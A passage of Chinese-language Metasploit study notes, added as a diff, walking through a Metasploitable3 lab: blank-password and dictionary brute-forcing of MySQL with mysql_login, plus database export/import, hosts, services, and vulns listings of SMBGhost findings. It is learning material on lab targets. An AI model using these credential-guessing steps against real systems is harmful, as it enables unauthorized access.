@@ -3193,6 +3193,722 @@ session -K 结束后台所有会话
 
 接下来打一下linux靶机
 下载好靶机 我们使用Metasploitable3-Linux 这个ubuntu系统镜像作为靶机
+配置一下靶机
+
+连接主机...
+连接主机成功
+Welcome to Ubuntu 14.04.6 LTS (GNU/Linux 3.13.0-170-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com/
+New release '16.04.7 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+Last login: Sun Feb 16 12:44:43 2025
+vagrant@metasploitable3-ub1404:~$ sudo passwd root
+Enter new UNIX password: 
+Retype new UNIX password: 
+passwd: password updated successfully
+vagrant@metasploitable3-ub1404:~$ su - root
+Password: 
+su: Authentication failure
+vagrant@metasploitable3-ub1404:~$ su - root
+Password: 
+root@metasploitable3-ub1404:~# apt install vim 
+Reading package lists... Done
+Building dependency tree       
+Reading state information... Done
+vim is already the newest version.
+The following packages were automatically installed and are no longer required:
+  amd64-microcode linux-modules-extra-3.13.0-170-generic
+Use 'apt-get autoremove' to remove them.
+0 upgraded, 0 newly installed, 0 to remove and 5 not upgraded.
+root@metasploitable3-ub1404:~# vim /etc/network/interfaces
+root@metasploitable3-ub1404:~# ifdown eth0 && ifup eth0
+
+直接检查空密码
+┌──(root💀tyza66)-[~/aircrack_8812au]
+└─# msfdb run
+[i] Database already started
+Metasploit tip: Enable HTTP request and response logging with set HttpTrace 
+true
+                                                  
+
+         .                                         .                         
+ .                                                                           
+                                                                             
+      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o            
+       '   dB'                     BBP                                       
+    dB'dB'dB' dBBP     dBP     dBP BB                                        
+   dB'dB'dB' dBP      dBP     dBP  BB                                        
+  dB'dB'dB' dBBBBP   dBP     dBBBBBBB                                        
+                                                                             
+                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP                                                                           
+          .                  .                  dB' dBP    dB'.BP            
+                             |       dBP    dBBBB' dBP    dB'.BP dBP    dBP  
+                           --o--    dBP    dBP    dBP    dB'.BP dBP    dBP   
+                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP    
+                                                                             
+                                                                    .        
+                .                                                            
+        o                  To boldly go where no                             
+                            shell has gone before                            
+                                                                             
+
+       =[ metasploit v6.4.9-dev                           ]
++ -- --=[ 2420 exploits - 1248 auxiliary - 423 post       ]
++ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > search mysql login
+
+Matching Modules
+================
+
+   #  Name                                                  Disclosure Date  Rank       Check  Description
+   -  ----                                                  ---------------  ----       -----  -----------
+   0  auxiliary/scanner/mysql/mysql_login                   .                normal     No     MySQL Login Utility
+   1  exploit/windows/mysql/scrutinizer_upload_exec         2012-07-27       excellent  Yes    Plixer Scrutinizer NetFlow and sFlow Analyzer 9 Default MySQL Credential                                                                
+   2  exploit/multi/http/zpanel_information_disclosure_rce  2014-01-30       excellent  No     Zpanel Remote Unauthenticated RCE                          
+   3    \_ target: Generic (PHP Payload)                    .                .          .      .
+   4    \_ target: Linux x86                                .                .          .      .
+
+
+Interact with a module by name or index. For example info 4, use 4 or use exploit/multi/http/zpanel_information_disclosure_rce                            
+After interacting with a module you can manually set a TARGET with set TARGET 'Linux x86'                                                                 
+
+msf6 > use 0
+[*] New in Metasploit 6.4 - The CreateSession option within this module can open an interactive session
+msf6 auxiliary(scanner/mysql/mysql_login) > show options
+
+Module options (auxiliary/scanner/mysql/mysql_login):
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   ANONYMOUS_LOGIN   false            yes       Attempt to login with a bla
+                                                nk username and password
+   BLANK_PASSWORDS   true             no        Try blank passwords for all
+                                                 users
+   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, fro
+                                                m 0 to 5
+   CreateSession     false            no        Create a new session for ev
+                                                ery successful login
+   DB_ALL_CREDS      false            no        Try each user/password coup
+                                                le stored in the current da
+                                                tabase
+   DB_ALL_PASS       false            no        Add all passwords in the cu
+                                                rrent database to the list
+   DB_ALL_USERS      false            no        Add all users in the curren
+                                                t database to the list
+   DB_SKIP_EXISTING  none             no        Skip existing credentials s
+                                                tored in the current databa
+                                                se (Accepted: none, user, u
+                                                ser&realm)
+   PASSWORD                           no        A specific password to auth
+                                                enticate with
+   PASS_FILE                          no        File containing passwords,
+                                                one per line
+   Proxies                            no        A proxy chain of format typ
+                                                e:host:port[,type:host:port
+                                                ][...]
+   RHOSTS                             yes       The target host(s), see htt
+                                                ps://docs.metasploit.com/do
+                                                cs/using-metasploit/basics/
+                                                using-metasploit.html
+   RPORT             3306             yes       The target port (TCP)
+   STOP_ON_SUCCESS   false            yes       Stop guessing when a creden
+                                                tial works for a host
+   THREADS           1                yes       The number of concurrent th
+                                                reads (max one per host)
+   USERNAME          root             no        A specific username to auth
+                                                enticate as
+   USERPASS_FILE                      no        File containing users and p
+                                                asswords separated by space
+                                                , one pair per line
+   USER_AS_PASS      false            no        Try the username as the pas
+                                                sword for all users
+   USER_FILE                          no        File containing usernames,
+                                                one per line
+   VERBOSE           true             yes       Whether to print output for
+                                                 all attempts
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/mysql/mysql_login) > set BLANK_PASSWORDS true
+BLANK_PASSWORDS => true
+msf6 auxiliary(scanner/mysql/mysql_login) > set R
+set REMOVE_PASS_FILE      set RHOSTS
+set REMOVE_USERPASS_FILE  set RPORT
+set REMOVE_USER_FILE      
+msf6 auxiliary(scanner/mysql/mysql_login) > set RHOSTS 192.168.101.180
+RHOSTS => 192.168.101.180
+msf6 auxiliary(scanner/mysql/mysql_login) > run
+
+[+] 192.168.101.180:3306  - 192.168.101.180:3306 - Found remote MySQL version 5.5.62
+[+] 192.168.101.180:3306  - 192.168.101.180:3306 - Success: 'root:'
+[*] 192.168.101.180:3306  - Scanned 1 of 1 hosts (100% complete)
+[*] 192.168.101.180:3306  - Bruteforce completed, 1 credential was successful.
+[*] 192.168.101.180:3306  - You can open an MySQL session with these credentials and CreateSession set to true
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/mysql/mysql_login) > 
+
+如果目标用户不是root就修改USERNAME
+之后在msf中有个命令叫creds 会把我们探测的凭证信息显示出来
+就是破解到的密码
+msf6 auxiliary(scanner/mysql/mysql_login) > creds
+Credentials
+===========
+
+host             origin           service           public  private  realm  private_type    JtR Format  cracked_password
+----             ------           -------           ------  -------  -----  ------------    ----------  ----------------
+192.168.101.180  192.168.101.180  3306/tcp (mysql)  root                    Blank password
+
+除了空密码 我们还可以用字典暴力破解
+指定字典文件进行了
+USER_FILE
+PASS_FILE
+USERPASS_FILE
+
+其实就是文本,一行一个
+
+建议用USER_FILE和PASS_FILE的组合的方式
+然后STOP_ON_SUCCESS 记得改成true 成功了自动停止
+还可以挂proxies代理
+
+这样会列出当前数据库里面所有的主机
+msf6 auxiliary(scanner/mysql/mysql_login) > back
+msf6 > hosts
+
+Hosts
+=====
+
+address   mac  name  os_name  os_flavor  os_sp  purpose  info  comments
+-------   ---  ----  -------  ---------  -----  -------  ----  --------
+192.168.
+101.103
+192.168.
+101.106
+192.168.
+101.107
+192.168.             Unknown                    device
+101.180
+
+如果我想把我当前进度的数据导出来保存或者交给另外一个同事
+一般就用db_export 和db_import
+msf6 > db_export -h
+Usage:
+    db_export -f <format> [filename]
+    Format can be one of: xml, pwdump
+[-] No output file was specified
+msf6 > db_export -f xml /root/home
+[*] Starting export of workspace default to /root/home [ xml ]...
+[*] Finished export of workspace default to /root/home [ xml ]...
+msf6 > 
+
+我们重新初始化一下(清空数据库)
+┌──(root💀tyza66)-[~/aircrack_8812au]
+└─# msfdb reinit
+┌──(root💀tyza66)-[~/aircrack_8812au]
+└─# msfdb reinit
+[i] Database already started
+[+] Dropping databases 'msf'
+[+] Dropping databases 'msf_test'
+[+] Dropping database user 'msf'
+[+] Deleting configuration file /usr/share/metasploit-framework/config/database.yml
+[+] Stopping database
+[+] Starting database
+[+] Creating database user 'msf'
+为新角色输入的口令: 
+再输入一遍: 
+[+] Creating databases 'msf'
+[+] Creating databases 'msf_test'
+[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
+[+] Creating initial database schema
+                                                                             
+┌──(root💀tyza66)-[~/aircrack_8812au]
+└─# msfdb run   
+[i] Database already started
+Metasploit tip: View advanced module options with advanced
+                                                  
+
+*Neutrino_Cannon*PrettyBeefy*PostalTime*binbash*deadastronauts*EvilBunnyWrote*L1T*Mail.ru*() { :;}; echo vulnerable*
+*Team sorceror*ADACTF*BisonSquad*socialdistancing*LeukeTeamNaam*OWASP Moncton*Alegori*exit*Vampire Bunnies*APT593*
+*QuePasaZombiesAndFriends*NetSecBG*coincoin*ShroomZ*Slow Coders*Scavenger Security*Bruh*NoTeamName*Terminal Cult*
+*edspiner*BFG*MagentaHats*0x01DA*Kaczuszki*AlphaPwners*FILAHA*Raffaela*HackSurYvette*outout*HackSouth*Corax*yeeb0iz*
+*SKUA*Cyber COBRA*flaghunters*0xCD*AI Generated*CSEC*p3nnm3d*IFS*CTF_Circle*InnotecLabs*baadf00d*BitSwitchers*0xnoobs*
+*ItPwns - Intergalactic Team of PWNers*PCCsquared*fr334aks*runCMD*0x194*Kapital Krakens*ReadyPlayer1337*Team 443*
+*H4CKSN0W*InfOUsec*CTF Community*DCZia*NiceWay*0xBlueSky*ME3*Tipi'Hack*Porg Pwn Platoon*Hackerty*hackstreetboys*
+*ideaengine007*eggcellent*H4x*cw167*localhorst*Original Cyan Lonkero*Sad_Pandas*FalseFlag*OurHeartBleedsOrange*SBWASP*
+*Cult of the Dead Turkey*doesthismatter*crayontheft*Cyber Mausoleum*scripterz*VetSec*norbot*Delta Squad Zero*Mukesh*
+*x00-x00*BlackCat*ARESx*cxp*vaporsec*purplehax*RedTeam@MTU*UsalamaTeam*vitamink*RISC*forkbomb444*hownowbrowncow*
+*etherknot*cheesebaguette*downgrade*FR!3ND5*badfirmware*Cut3Dr4g0n*dc615*nora*Polaris One*team*hail hydra*Takoyaki*
+*Sudo Society*incognito-flash*TheScientists*Tea Party*Reapers of Pwnage*OldBoys*M0ul3Fr1t1B13r3*bearswithsaws*DC540*
+*iMosuke*Infosec_zitro*CrackTheFlag*TheConquerors*Asur*4fun*Rogue-CTF*Cyber*TMHC*The_Pirhacks*btwIuseArch*MadDawgs*
+*HInc*The Pighty Mangolins*CCSF_RamSec*x4n0n*x0rc3r3rs*emehacr*Ph4n70m_R34p3r*humziq*Preeminence*UMGC*ByteBrigade*
+*TeamFastMark*Towson-Cyberkatz*meow*xrzhev*PA Hackers*Kuolema*Nakateam*L0g!c B0mb*NOVA-InfoSec*teamstyle*Panic*
+*B0NG0R3*                                                                                    *Les Cadets Rouges*buf*
+*Les Tontons Fl4gueurs*                                                                      *404 : Flag Not Found*
+*' UNION SELECT 'password*      _________                __                                  *OCD247*Sparkle Pony*                                        
+*burner_herz0g*                 \_   ___ \_____  _______/  |_ __ _________   ____            *Kill$hot*ConEmu*                                            
+*here_there_be_trolls*          /    \  \/\__  \ \____ \   __\  |  \_  __ \_/ __ \           *;echo"hacked"*                                              
+*r4t5_*6rung4nd4*NYUSEC*        \     \____/ __ \|  |_> >  | |  |  /|  | \/\  ___/           *karamel4e*                                                  
+*IkastenIO*TWC*balkansec*        \______  (____  /   __/|__| |____/ |__|    \___  >          *cybersecurity.li*                                           
+*TofuEelRoll*Trash Pandas*              \/     \/|__|                           \/           *OneManArmy*cyb3r_w1z4rd5*                                   
+*Astra*Got Schwartz?*tmux*                  ___________.__                                   *AreYouStuck*Mr.Robot.0*                                     
+*\nls*Juicy white peach*                    \__    ___/|  |__   ____                         *EPITA Rennes*                                               
+*HackerKnights*                               |    |   |  |  \_/ __ \                        *guildOfGengar*Titans*                                       
+*Pentest Rangers*                             |    |   |   Y  \  ___/                        *The Libbyrators*                                            
+*placeholder name*bitup*                      |____|   |___|  /\___  >                       *JeffTadashi*Mikeal*                                         
+*UCASers*onotch*                                            \/     \/                        *ky_dong_day_song*                                           
+*NeNiNuMmOk*                              ___________.__                                     *JustForFun!*                                                
+*Maux de tête*LalaNG*                     \_   _____/|  | _____     ____                     *g3tsh3Lls0on*                                               
+*crr0tz*z3r0p0rn*clueless*                 |    __)  |  | \__  \   / ___\                    *Phở Đặc Biệt*Paradox*                                       
+*HackWara*                                 |     \   |  |__/ __ \_/ /_/  >                   *KaRIPux*inf0sec*                                            
+*Kugelschreibertester*                     \___  /   |____(____  /\___  /                    *bluehens*Antoine77*                                         
+*icemasters*                                   \/              \//_____/                     *genxy*TRADE_NAMES*                                          
+*Spartan's Ravens*                       _______________   _______________                   *BadByte*fontwang_tw*                                        
+*g0ldd1gg3rs*pappo*                     \_____  \   _  \  \_____  \   _  \                   *ghoti*                                                      
+*Les CRACKS*c0dingRabbits*               /  ____/  /_\  \  /  ____/  /_\  \                  *LinuxRiders*                                                
+*2Cr4Sh*RecycleBin*                     /       \  \_/   \/       \  \_/   \                 *Jalan Durian*                                               
+*ExploitStudio*                         \_______ \_____  /\_______ \_____  /                 *WPICSC*logaritm*                                            
+*Car RamRod*0x41414141*                         \/     \/         \/     \/                  *Orv1ll3*team-fm4dd*                                         
+*Björkson*FlyingCircus*                                                                      *PwnHub*H4X0R*Yanee*
+*Securifera*hot cocoa*                                                                       *Et3rnal*PelarianCP*
+*n00bytes*DNC&G*guildzero*dorko*tv*42*{EHF}*CarpeDien*Flamin-Go*BarryWhite*XUcyber*FernetInjection*DCcurity*
+*Mars Explorer*ozen_cfw*Fat Boys*Simpatico*nzdjb*Isec-U.O*The Pomorians*T35H*H@wk33*JetJ*OrangeStar*Team Corgi*
+*D0g3*0itch*OffRes*LegionOfRinf*UniWA*wgucoo*Pr0ph3t*L0ner*_n00bz*OSINT Punchers*Tinfoil Hats*Hava*Team Neu*
+*Cyb3rDoctor*Techlock Inc*kinakomochi*DubbelDopper*bubbasnmp*w*Gh0st$*tyl3rsec*LUCKY_CLOVERS*ev4d3rx10-team*ir4n6*
+*PEQUI_ctf*HKLBGD*L3o*5 bits short of a byte*UCM*ByteForc3*Death_Geass*Stryk3r*WooT*Raise The Black*CTErr0r*
+*Individual*mikejam*Flag Predator*klandes*_no_Skids*SQ.*CyberOWL*Ironhearts*Kizzle*gauti*
+*San Antonio College Cyber Rangers*sam.ninja*Akerbeltz*cheeseroyale*Ephyra*sard city*OrderingChaos*Pickle_Ricks*
+*Hex2Text*defiant*hefter*Flaggermeister*Oxford Brookes University*OD1E*noob_noob*Ferris Wheel*Ficus*ONO*jameless*
+*Log1c_b0mb*dr4k0t4*0th3rs*dcua*cccchhhh6819*Manzara's Magpies*pwn4lyfe*Droogy*Shrubhound Gang*ssociety*HackJWU*
+*asdfghjkl*n00bi3*i-cube warriors*WhateverThrone*Salvat0re*Chadsec*0x1337deadbeef*StarchThingIDK*Tieto_alaviiva_turva*
+*InspiV*RPCA Cyber Club*kurage0verfl0w*lammm*pelicans_for_freedom*switchteam*tim*departedcomputerchairs*cool_runnings*
+*chads*SecureShell*EetIetsHekken*CyberSquad*P&K*Trident*RedSeer*SOMA*EVM*BUckys_Angels*OrangeJuice*DemDirtyUserz*
+*OpenToAll*Born2Hack*Bigglesworth*NIS*10Monkeys1Keyboard*TNGCrew*Cla55N0tF0und*exploits33kr*root_rulzz*InfosecIITG*
+*superusers*H@rdT0R3m3b3r*operators*NULL*stuxCTF*mHackresciallo*Eclipse*Gingabeast*Hamad*Immortals*arasan*MouseTrap*
+*damn_sadboi*tadaaa*null2root*HowestCSP*fezfezf*LordVader*Fl@g_Hunt3rs*bluenet*P@Ge2mE*
 
 
 
+       =[ metasploit v6.4.9-dev                           ]
++ -- --=[ 2420 exploits - 1248 auxiliary - 423 post       ]
++ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > hosts
+
+Hosts
+=====
+
+address  mac  name  os_name  os_flavor  os_sp  purpose  info  comments
+-------  ---  ----  -------  ---------  -----  -------  ----  --------
+
+msf6 > db_import /root/home/bak.xml
+[-] No such file /root/home/bak.xml
+msf6 > db_import /root/bak.xml
+[-] No such file /root/bak.xml
+msf6 > db_import /root/home.xml
+[-] No such file /root/home.xml
+msf6 > db_import /root/home
+[*] Importing 'Metasploit XML' data
+[*] Importing host 192.168.101.103
+[*] Importing host 192.168.101.106
+[*] Importing host 192.168.101.107
+[*] Importing host 192.168.101.180
+[*] Successfully imported /root/home
+msf6 > hosts
+
+Hosts
+=====
+
+address   mac  name  os_name  os_flavor  os_sp  purpose  info  comments
+-------   ---  ----  -------  ---------  -----  -------  ----  --------
+192.168.                                        device
+101.103
+192.168.                                        device
+101.106
+192.168.                                        device
+101.107
+192.168.             Unknown                    device
+101.180
+
+
+这里我文件名起的不好
+正常可以db_export -f xml /root/bak.xml
+不要想我一样叫home 这样指定的是文件不是文件夹
+msf6 > db_export -f xml /root/bak.xml
+[*] Starting export of workspace default to /root/bak.xml [ xml ]...
+[*] Finished export of workspace default to /root/bak.xml [ xml ]...
+msf6 > hosts
+
+Hosts
+=====
+
+address   mac  name  os_name  os_flavor  os_sp  purpose  info  comments
+-------   ---  ----  -------  ---------  -----  -------  ----  --------
+192.168.                                        device
+101.103
+192.168.                                        device
+101.106
+192.168.                                        device
+101.107
+192.168.             Unknown                    device
+101.180
+
+msf6 > exit
+                                                                             
+┌──(root💀tyza66)-[~/aircrack_8812au]
+└─# msfdb reinit
+[i] Database already started
+[+] Dropping databases 'msf'
+[+] Dropping databases 'msf_test'
+[+] Dropping database user 'msf'
+[+] Deleting configuration file /usr/share/metasploit-framework/config/database.yml
+[+] Stopping database
+[+] Starting database
+[+] Creating database user 'msf'
+为新角色输入的口令: 
+再输入一遍: 
+[+] Creating databases 'msf'
+[+] Creating databases 'msf_test'
+[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
+[+] Creating initial database schema
+                                                                             
+┌──(root💀tyza66)-[~/aircrack_8812au]
+└─# msfdb run   
+[i] Database already started
+Metasploit tip: View missing module options with show missing
+                                                  
+ _                                                    _
+/ \    /\         __                         _   __  /_/ __                  
+| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \                 
+| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|                
+|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_                
+      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\               
+                                                                             
+
+       =[ metasploit v6.4.9-dev                           ]
++ -- --=[ 2420 exploits - 1248 auxiliary - 423 post       ]
++ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > db_import /root/bak.xml
+[*] Importing 'Metasploit XML' data
+[*] Importing host 192.168.101.103
+[*] Importing host 192.168.101.106
+[*] Importing host 192.168.101.107
+[*] Importing host 192.168.101.180
+[*] Successfully imported /root/bak.xml
+msf6 > hosts
+
+Hosts
+=====
+
+address   mac  name  os_name  os_flavor  os_sp  purpose  info  comments
+-------   ---  ----  -------  ---------  -----  -------  ----  --------
+192.168.                                        device
+101.103
+192.168.                                        device
+101.106
+192.168.                                        device
+101.107
+192.168.             Unknown                    device
+101.180
+
+然后我们其实不只可以看主机列表
+msf6 > hosts -h
+Usage: hosts [ options ] [addr1 addr2 ...]
+
+
+OPTIONS:
+
+    -a, --add <host>                       Add the hosts instead of searching
+    -c, --columns <columns>                Only show the given columns (see list below)
+    -C, --columns-until-restart <columns>  Only show the given columns until the next restart (see list below)
+    -d, --delete <hosts>                   Delete the hosts instead of searching
+    -h, --help                             Show this help information
+    -i, --info <info>                      Change the info of a host
+    -m, --comment <comment>                Change the comment of a host
+    -n, --name <name>                      Change the name of a host
+    -O, --order <column id>                Order rows by specified column number
+    -o, --output <filename>                Send output to a file in csv format
+    -R, --rhosts                           Set RHOSTS from the results of the search
+    -S, --search <filter>                  Search string to filter by
+    -T, --delete-tag <tag>                 Remove a tag from a range of hosts
+    -t, --tag <tag>                        Add or specify a tag to a range of hosts
+    -u, --up                               Only show hosts which are up
+
+Available columns: address, arch, comm, comments, created_at, cred_count, detected_arch, exploit_attempt_count, host_detail_count, info, mac, name, note_count, os_family, os_flavor, os_lang, os_name, os_sp, purpose, scope, service_count, state, updated_at, virtual_host, vuln_count, tags
+
+比如说使用-c指定字段
+msf6 > hosts -c address,name,os_name
+
+Hosts
+=====
+
+address          name  os_name
+-------          ----  -------
+192.168.101.103
+192.168.101.106
+192.168.101.107
+192.168.101.180        Unknown
+
+删除用-d 指定地址
+
+还有个services指令
+msf6 > services
+Services
+========
+
+host             port  proto  name   state  info
+----             ----  -----  ----   -----  ----
+192.168.101.180  3306  tcp    mysql  open   5.5.62-0ubuntu0.14.04.1
+
+
+它也可以添加删除 指定列 派粗
+有个-R 会将搜到的主机添加到RHOSTS里面
+
+msf6 > services -h
+Usage: services [-h] [-u] [-a] [-r <proto>] [-p <port1,port2>] [-s <name1,name2>] [-o <filename>] [addr1 addr2 ...]
+
+
+OPTIONS:
+
+    -a, --add                  Add the services instead of searching.
+    -c, --column <col1,col2>   Only show the given columns.
+    -d, --delete               Delete the services instead of searching.
+    -h, --help                 Show this help information.
+    -O, --order <column id>    Order rows by specified column number.
+    -o, --output <filename>    Send output to a file in csv format.
+    -p, --port <ports>         Search for a list of ports.
+    -r, --protocol <protocol>  Protocol type of the service being added [tcp|udp].
+    -R, --rhosts               Set RHOSTS from the results of the search.
+    -s, --name <name>          Name of the service to add.
+    -S, --search <filter>      Search string to filter by.
+    -u, --up                   Only show services which are up.
+    -U, --update               Update data for existing service.
+
+Available columns: created_at, info, name, port, proto, state, updated_at
+
+还可以vulns 显示出曾经使用的某些EXP渗透成功的结果
+msf6 > vulns 
+
+Vulnerabilities
+===============
+
+Timestamp          Host             Name                References
+---------          ----             ----                ----------
+2025-02-16 09:09:  192.168.101.103  SMBv3 Compression   CVE-2020-0796,URL-h
+57 UTC                              Buffer Overflow     ttps://ricercasecur
+                                                        ity.blogspot.com/20
+                                                        20/04/ill-ask-your-
+                                                        body-smbghost-pre-a
+                                                        uth-rce.html,URL-ht
+                                                        tps://github.com/ch
+                                                        ompie1337/SMBGhost_
+                                                        RCE_PoC,URL-https:/
+                                                        /www.youtube.com/wa
+                                                        tch?v=RSV3f6aEJFY&t
+                                                        =1865s,URL-https://
+                                                        www.coresecurity.co
+                                                        m/core-labs/article
+                                                        s/getting-physical-
+                                                        extreme-abuse-of-in
+                                                        tel-based-paging-sy
+                                                        stems,URL-https://w
+                                                        ww.coresecurity.com
+                                                        /core-labs/articles
+                                                        /getting-physical-e
+                                                        xtreme-abuse-of-int
+                                                        el-based-paging-sys
+                                                        tems-part-2-windows
+                                                        ,URL-https://labs.b
+                                                        luefrostsecurity.de
+                                                        /blog/2017/05/11/wi
+                                                        ndows-10-hals-heap-
+                                                        extinction-of-the-h
+                                                        alpinterruptcontrol
+                                                        ler-table-exploitat
+                                                        ion-technique/
+2025-02-16 09:32:  192.168.101.106  SMBv3 Compression   CVE-2020-0796,URL-h
+11 UTC                              Buffer Overflow     ttps://ricercasecur
+                                                        ity.blogspot.com/20
+                                                        20/04/ill-ask-your-
+                                                        body-smbghost-pre-a
+                                                        uth-rce.html,URL-ht
+                                                        tps://github.com/ch
+                                                        ompie1337/SMBGhost_
+                                                        RCE_PoC,URL-https:/
+                                                        /www.youtube.com/wa
+                                                        tch?v=RSV3f6aEJFY&t
+                                                        =1865s,URL-https://
+                                                        www.coresecurity.co
+                                                        m/core-labs/article
+                                                        s/getting-physical-
+                                                        extreme-abuse-of-in
+                                                        tel-based-paging-sy
+                                                        stems,URL-https://w
+                                                        ww.coresecurity.com
+                                                        /core-labs/articles
+                                                        /getting-physical-e
+                                                        xtreme-abuse-of-int
+                                                        el-based-paging-sys
+                                                        tems-part-2-windows
+                                                        ,URL-https://labs.b
+                                                        luefrostsecurity.de
+                                                        /blog/2017/05/11/wi
+                                                        ndows-10-hals-heap-
+                                                        extinction-of-the-h
+                                                        alpinterruptcontrol
+                                                        ler-table-exploitat
+                                                        ion-technique/
+2025-02-16 09:53:  192.168.101.107  SMBv3 Compression   CVE-2020-0796,URL-h
+52 UTC                              Buffer Overflow     ttps://ricercasecur
+                                                        ity.blogspot.com/20
+                                                        20/04/ill-ask-your-
+                                                        body-smbghost-pre-a
+                                                        uth-rce.html,URL-ht
+                                                        tps://github.com/ch
+                                                        ompie1337/SMBGhost_
+                                                        RCE_PoC,URL-https:/
+                                                        /www.youtube.com/wa
+                                                        tch?v=RSV3f6aEJFY&t
+                                                        =1865s,URL-https://
+                                                        www.coresecurity.co
+                                                        m/core-labs/article
+                                                        s/getting-physical-
+                                                        extreme-abuse-of-in
+                                                        tel-based-paging-sy
+                                                        stems,URL-https://w
+                                                        ww.coresecurity.com
+                                                        /core-labs/articles
+                                                        /getting-physical-e
+                                                        xtreme-abuse-of-int
+                                                        el-based-paging-sys
+                                                        tems-part-2-windows
+                                                        ,URL-https://labs.b
+                                                        luefrostsecurity.de
+                                                        /blog/2017/05/11/wi
+                                                        ndows-10-hals-heap-
+                                                        extinction-of-the-h
+                                                        alpinterruptcontrol
+                                                        ler-table-exploitat
+                                                        ion-technique/
+
+msf6 > 
+
+除此之外 还可以查看指定主机
+msf6 > services 192.168.101.180
+Services
+========
+
+host             port  proto  name   state  info
+----             ----  -----  ----   -----  ----
+192.168.101.180  3306  tcp    mysql  open   5.5.62-0ubuntu0.14.04.1
+
+删除主机
+msf6 > hosts -d 192.168.101.180
+
+Hosts
+=====
+
+address   mac  name  os_name  os_flavor  os_sp  purpose  info  comments
+-------   ---  ----  -------  ---------  -----  -------  ----  --------
+192.168.             Unknown                    device
+101.180
+
+[*] Deleted 1 hosts
+msf6 > hosts
+
+Hosts
+=====
+
+address   mac  name  os_name  os_flavor  os_sp  purpose  info  comments
+-------   ---  ----  -------  ---------  -----  -------  ----  --------
+192.168.                                        device
+101.103
+192.168.                                        device
+101.106
+192.168.                                        device
+101.107
+
+
+核心命令
+=============
+？ 帮助菜单
+banner 显示一个 metasploit 横幅
+cd 更改当前的工作目录
+color 切换颜色
+connect 连接与主机通信
+exit 退出控制台
+get 获取特定于上下文的变量的值
+getg 获取全局变量的值
+grep grep 另一个命令的输出 如： grep creds help
+help 帮助菜单
+history 显示命令历史
+irb 进入 irb 脚本模式
+load 加载一个框架插件
+quit 退出控制台
+route 通过会话路由流量
+save 保存活动的数据存储
+sessions 转储会话列表并显示有关会话的信息
+set 将特定于上下文的变量设置为一个值
+setg 将全局变量设置为一个值
+sleep 在指定的秒数内不做任何事情
+spool 将控制台输出写入文件以及屏幕
+threads 线程查看和操作后台线程
+unload 卸载框架插件
+unset 取消设置一个或多个特定于上下文的变量
+unsetg 取消设置一个或多个全局变量
+version 显示框架和控制台库版本号
+模块命令
+===============
+advanced 显示一个或多个模块的高级选项
+back 从当前上下文返回
+edit 使用首选编辑器编辑当前模块
+info 显示有关一个或多个模块的信息
+loadpath 路径从路径搜索并加载模块
+options 显示全局选项或一个或多个模块
+popm 将最新的模块从堆栈中弹出并使其处于活动状态
+previous 将之前加载的模块设置为当前模块
+pushm 将活动或模块列表推入模块堆栈
+reload_all 从所有定义的模块路径重新加载所有模块
+search 搜索模块名称和描述
+show 显示给定类型的模块或所有模块
+use 按名称选择模块
+工作命令
+============
+handler 作为作业启动负载处理程序
+jobs 显示和管理作业
+kill 杀死一个工作
+rename_job 重命名作业
+资源脚本命令
+========================
+makerc 保存从开始到文件输入的命令
+resource 运行存储在文件中的命令
+数据库后端命令
+=========================
+db_connect 连接到现有的数据库
+db_disconnect 断开与当前数据库实例的连接
+db_export 导出包含数据库内容的文件
+db_import 导入扫描结果文件（文件类型将被自动检测）
+db_nmap 执行 nmap 并自动记录输出
+db_rebuild_cache 重建数据库存储的模块高速缓存
+db_status 显示当前的数据库状态
+hosts 列出数据库中的所有主机
+loot 列出数据库中的所有战利品
+notes 列出数据库中的所有笔记
+services 列出数据库中的所有服务
+vulns 列出数据库中的所有漏洞
+workspace 在数据库工作区之间切换
+凭证后端命令
+============================
+creds 列出数据库中的所有凭据
